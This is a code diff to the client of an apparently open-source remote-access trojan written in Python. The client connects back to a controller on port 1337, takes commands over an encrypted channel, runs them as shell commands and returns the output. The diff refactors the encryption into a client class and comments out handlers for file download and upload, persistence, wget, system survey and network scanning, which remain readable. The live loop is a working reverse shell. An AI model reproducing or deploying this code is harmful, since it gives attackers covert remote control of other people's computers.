@@ -17,6 +17,7 @@ from core import persistence
 from core import scan
 from core import survey
 from core import toolkit
+from core import common
 
 
 PLAT = sys.platform
@@ -27,19 +28,12 @@ PORT = 1337
 def main():
     s = socket.socket()
     s.connect((HOST, PORT))
-
-    dh_key  = crypto.diffiehellman(s)
-    GCM     = crypto.AES_GCM(dh_key)
-    IV      = 0
-
-    s.setblocking(0)
+    client = common.Client(s, HOST, 1)
 
     while True:
-        data = crypto.recvGCM(s, GCM)
+        data = client.recvGCM()
         if not data:
             continue
-
-        IV += 1
 
         # seperate prompt into command and action
         cmd, _, action = data.partition(' ')
@@ -55,54 +49,54 @@ def main():
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
             results = results.stdout.read() + results.stderr.read()
-            crypto.sendGCM(s, GCM, IV, results)
+            client.sendGCM(results)
 
-        # send file
-        elif cmd == 'download':
-            for fname in action.split():
-                fname = fname.strip()
-                if not os.path.isfile(fname):
-                    continue
+        # # send file
+        # elif cmd == 'download':
+        #     for fname in action.split():
+        #         fname = fname.strip()
+        #         if not os.path.isfile(fname):
+        #             continue
 
-                filesock.sendfile(s, GCM, IV, fname)
+        #         filesock.sendfile(s, GCM, IV, fname)
 
-        # receive file
-        elif cmd == 'upload':
-            for fname in action.split():
-                fname = fname.strip()
-                if os.path.isfile(fname):
-                    continue
+        # # receive file
+        # elif cmd == 'upload':
+        #     for fname in action.split():
+        #         fname = fname.strip()
+        #         if os.path.isfile(fname):
+        #             continue
 
-                filesock.recvfile(s, GCM, fname)
+        #         filesock.recvfile(s, GCM, fname)
 
-        # regenerate DH key
-        elif cmd == 'rekey':
-            dh_key = crypto.diffiehellman(s)
+        # # regenerate DH key
+        # elif cmd == 'rekey':
+        #     dh_key = crypto.diffiehellman(s)
 
-        # apply persistence mechanism
-        elif cmd == 'persistence':
-            results = persistence.run(PLAT)
-            crypto.sendGCM(s, GCM, IV, results)
+        # # apply persistence mechanism
+        # elif cmd == 'persistence':
+        #     results = persistence.run(PLAT)
+        #     crypto.sendGCM(s, GCM, IV, results)
 
-        # download a file from the web
-        elif cmd == 'wget':
-            results = toolkit.wget(action)
-            crypto.sendGCM(s, GCM, IV, results)
+        # # download a file from the web
+        # elif cmd == 'wget':
+        #     results = toolkit.wget(action)
+        #     crypto.sendGCM(s, GCM, IV, results)
 
-        # unzip a file
-        elif cmd == 'unzip':
-            results = toolkit.unzip(action)
-            crypto.sendGCM(s, GCM, IV, results)
+        # # unzip a file
+        # elif cmd == 'unzip':
+        #     results = toolkit.unzip(action)
+        #     crypto.sendGCM(s, GCM, IV, results)
 
-        # run system survey
-        elif cmd == 'survey':
-            results = survey.run(PLAT)
-            crypto.sendGCM(s, GCM, IV, results)
+        # # run system survey
+        # elif cmd == 'survey':
+        #     results = survey.run(PLAT)
+        #     crypto.sendGCM(s, GCM, IV, results)
 
-        # run a scan
-        elif cmd == 'scan':
-            results = scan.single_host(action)
-            crypto.sendGCM(s, GCM, IV, results)
+        # # run a scan
+        # elif cmd == 'scan':
+        #     results = scan.single_host(action)
+        #     crypto.sendGCM(s, GCM, IV, results)
 
 
 if __name__ == '__main__':
